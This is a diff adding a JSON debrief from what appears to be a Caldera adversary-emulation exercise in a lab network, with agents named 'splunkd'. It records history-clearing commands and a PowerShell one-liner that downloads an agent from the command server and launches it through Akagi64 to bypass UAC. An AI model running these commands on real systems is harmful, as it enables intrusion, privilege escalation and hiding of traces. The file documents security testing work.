@@ -1,0 +1,447 @@
+{
+  "filename": "debrief_2025-03-05_09-26-45",
+  "json_bytes": [
+    {
+      "name": "Privilege escalation",
+      "host_group": [
+        {
+          "paw": "kgqljb",
+          "sleep_min": 30,
+          "sleep_max": 60,
+          "watchdog": 0,
+          "group": "red",
+          "architecture": "amd64",
+          "platform": "linux",
+          "server": "http://10.111.8.251:8888",
+          "upstream_dest": "http://10.111.8.251:8888",
+          "username": "caldera-ubuntu",
+          "location": "/home/caldera-ubuntu/splunkd",
+          "pid": 5310,
+          "ppid": 5307,
+          "trusted": true,
+          "executors": [
+            "proc",
+            "sh"
+          ],
+          "privilege": "User",
+          "exe_name": "splunkd",
+          "host": "caldera-ubuntu-Standard-PC-i440FX-PIIX-1996",
+          "contact": "HTTP",
+          "proxy_receivers": {},
+          "proxy_chain": [],
+          "origin_link_id": "",
+          "deadman_enabled": true,
+          "available_contacts": [
+            "HTTP"
+          ],
+          "host_ip_addrs": [
+            "10.111.8.252"
+          ],
+          "display_name": "caldera-ubuntu-Standard-PC-i440FX-PIIX-1996$caldera-ubuntu",
+          "created": "2025-03-04T19:21:31Z",
+          "last_seen": "2025-03-05T09:26:15Z",
+          "links": [
+            {
+              "id": "eb42662c-c02e-4453-9fd4-e9e37abda55e",
+              "paw": "kgqljb",
+              "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+              "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+              "status": 0,
+              "score": 0,
+              "jitter": 0,
+              "decide": "2025-03-04T19:21:31Z",
+              "pin": 0,
+              "pid": "8603",
+              "facts": [],
+              "relationships": [],
+              "used": [],
+              "unique": "eb42662c-c02e-4453-9fd4-e9e37abda55e",
+              "collect": "2025-03-04T19:21:31Z",
+              "finish": "2025-03-04T19:21:31Z",
+              "ability": {
+                "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+                "tactic": "defense-evasion",
+                "technique_name": "Indicator Removal on Host: Clear Command History",
+                "technique_id": "T1070.003",
+                "name": "Avoid logs",
+                "description": "Stop terminal from logging history",
+                "executors": [
+                  {
+                    "name": "sh",
+                    "platform": "darwin",
+                    "command": "> $HOME/.bash_history && unset HISTFILE",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  },
+                  {
+                    "name": "sh",
+                    "platform": "linux",
+                    "command": "> $HOME/.bash_history && unset HISTFILE",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  },
+                  {
+                    "name": "psh",
+                    "platform": "windows",
+                    "command": "Clear-History;Clear",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  }
+                ],
+                "requirements": [],
+                "privilege": null,
+                "repeatable": false,
+                "buckets": [
+                  "defense-evasion"
+                ],
+                "additional_info": {},
+                "access": {},
+                "singleton": false,
+                "plugin": "stockpile",
+                "delete_payload": true
+              },
+              "executor": {
+                "name": "sh",
+                "platform": "linux",
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              "cleanup": 0,
+              "visibility": {
+                "score": 50,
+                "adjustments": []
+              },
+              "host": "caldera-ubuntu-Standard-PC-i440FX-PIIX-1996",
+              "output": "False",
+              "deadman": false,
+              "agent_reported_time": "2025-03-04T19:21:31Z"
+            }
+          ],
+          "pending_contact": "HTTP"
+        },
+        {
+          "paw": "mqcpsj",
+          "sleep_min": 30,
+          "sleep_max": 60,
+          "watchdog": 0,
+          "group": "red",
+          "architecture": "amd64",
+          "platform": "windows",
+          "server": "http://10.111.8.251:8888",
+          "upstream_dest": "http://10.111.8.251:8888",
+          "username": "DESKTOP-7170H5C\\Caldera-windows",
+          "location": "C:\\Users\\Public\\splunkd.exe",
+          "pid": 4864,
+          "ppid": 8252,
+          "trusted": true,
+          "executors": [
+            "cmd",
+            "psh",
+            "proc"
+          ],
+          "privilege": "User",
+          "exe_name": "splunkd.exe",
+          "host": "DESKTOP-7170H5C",
+          "contact": "HTTP",
+          "proxy_receivers": {},
+          "proxy_chain": [],
+          "origin_link_id": "",
+          "deadman_enabled": true,
+          "available_contacts": [
+            "HTTP"
+          ],
+          "host_ip_addrs": [
+            "10.111.8.253"
+          ],
+          "display_name": "DESKTOP-7170H5C$DESKTOP-7170H5C\\Caldera-windows",
+          "created": "2025-03-05T07:29:59Z",
+          "last_seen": "2025-03-05T09:26:14Z",
+          "links": [
+            {
+              "id": "e9cb534a-4184-405d-944d-5853d3f48dab",
+              "paw": "mqcpsj",
+              "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+              "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+              "status": 0,
+              "score": 0,
+              "jitter": 0,
+              "decide": "2025-03-05T07:29:59Z",
+              "pin": 0,
+              "pid": "8612",
+              "facts": [],
+              "relationships": [],
+              "used": [],
+              "unique": "e9cb534a-4184-405d-944d-5853d3f48dab",
+              "collect": "2025-03-05T07:29:59Z",
+              "finish": "2025-03-05T07:30:02Z",
+              "ability": {
+                "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+                "tactic": "defense-evasion",
+                "technique_name": "Indicator Removal on Host: Clear Command History",
+                "technique_id": "T1070.003",
+                "name": "Avoid logs",
+                "description": "Stop terminal from logging history",
+                "executors": [
+                  {
+                    "name": "sh",
+                    "platform": "darwin",
+                    "command": "> $HOME/.bash_history && unset HISTFILE",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  },
+                  {
+                    "name": "sh",
+                    "platform": "linux",
+                    "command": "> $HOME/.bash_history && unset HISTFILE",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  },
+                  {
+                    "name": "psh",
+                    "platform": "windows",
+                    "command": "Clear-History;Clear",
+                    "code": null,
+                    "language": null,
+                    "build_target": null,
+                    "payloads": [],
+                    "uploads": [],
+                    "timeout": 60,
+                    "parsers": [],
+                    "cleanup": [],
+                    "variations": [],
+                    "additional_info": {}
+                  }
+                ],
+                "requirements": [],
+                "privilege": null,
+                "repeatable": false,
+                "buckets": [
+                  "defense-evasion"
+                ],
+                "additional_info": {},
+                "access": {},
+                "singleton": false,
+                "plugin": "stockpile",
+                "delete_payload": true
+              },
+              "executor": {
+                "name": "psh",
+                "platform": "windows",
+                "command": "Clear-History;Clear",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              "cleanup": 0,
+              "visibility": {
+                "score": 50,
+                "adjustments": []
+              },
+              "host": "DESKTOP-7170H5C",
+              "output": "False",
+              "deadman": false,
+              "agent_reported_time": "2025-03-05T07:29:58Z"
+            }
+          ],
+          "pending_contact": "HTTP"
+        }
+      ],
+      "start": "2025-03-05T07:37:59Z",
+      "steps": {
+        "kgqljb": {
+          "steps": []
+        },
+        "mqcpsj": {
+          "steps": [
+            {
+              "link_id": "af13310c-1660-4826-bafb-2f2d3595cafd",
+              "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
+              "command": "$url=\"http://10.111.8.251:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$wc.Headers.add(\"server\",\"http://10.111.8.251:8888\");$wc.Headers.add(\"defaultSleep\",\"60\");$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server http://10.111.8.251:8888\"",
+              "plaintext_command": "$url=\"http://10.111.8.251:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$wc.Headers.add(\"server\",\"http://10.111.8.251:8888\");$wc.Headers.add(\"defaultSleep\",\"60\");$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server http://10.111.8.251:8888\"",
+              "delegated": "2025-03-05T07:39:39Z",
+              "run": "2025-03-05T07:40:21Z",
+              "status": 1,
+              "platform": "windows",
+              "executor": "psh",
+              "pid": 9016,
+              "description": "UIPI bypass with uiAccess application",
+              "name": "duser/osksupport DLL Hijack",
+              "attack": {
+                "tactic": "privilege-escalation",
+                "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
+                "technique_id": "T1548.002"
+              },
+              "output": {
+                "stdout": "",
+                "stderr": "Error al ejecutar el programa 'Akagi64.exe': No se pudo completar la operacin porque el archivo contiene un virus o software potencialmente no deseadoEn lnea: 1 Carcter: 529+ ... exe\",$data);.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server http: ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.En lnea: 1 Carcter: 529+ ... exe\",$data);.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server http: ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException    + FullyQualifiedErrorId : NativeCommandFailed ",
+                "exit_code": "1"
+              },
+              "agent_reported_time": "2025-03-05T07:40:13Z"
+            }
+          ]
+        }
+      },
+      "finish": "2025-03-05T07:41:30Z",
+      "planner": "atomic",
+      "adversary": {
+        "adversary_id": "ad-hoc",
+        "name": "ad-hoc",
+        "description": "an empty adversary profile",
+        "atomic_ordering": [],
+        "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+        "tags": [],
+        "has_repeatable_abilities": false,
+        "plugin": ""
+      },
+      "jitter": "2/8",
+      "objectives": {
+        "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+        "name": "default",
+        "description": "This is a default objective that runs forever.",
+        "goals": [
+          {
+            "target": "exhaustion",
+            "value": "complete",
+            "count": 1048576,
+            "operator": "==",
+            "achieved": false
+          }
+        ],
+        "percentage": 0
+      },
+      "facts": [
+        {
+          "unique": "file.sensitive.extensionwav",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "wav",
+          "created": "2025-03-04T19:21:16Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "IMPORTED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": ""
+        },
+        {
+          "unique": "file.sensitive.extensionyml",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "yml",
+          "created": "2025-03-04T19:21:16Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "IMPORTED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": ""
+        },
+        {
+          "unique": "file.sensitive.extensionpng",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "png",
+          "created": "2025-03-04T19:21:16Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "IMPORTED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": ""
+        },
+        {
+          "unique": "server.malicious.urlkeyloggedsite.com",
+          "trait": "server.malicious.url",
+          "name": "server.malicious.url",
+          "value": "keyloggedsite.com",
+          "created": "2025-03-04T19:21:16Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "IMPORTED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": ""
+        }
+      ],
+      "skipped_abilities": [
+        {
+          "kgqljb": [
+            {
+              "reason": "Mismatched ability platform and executor",
+              "reason_id": 1,
+              "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
+              "ability_name": "duser/osksupport DLL Hijack"
+            }
+          ]
+        },
+        {
+          "mqcpsj": []
+        }
+      ]
+    }
+  ]
+}
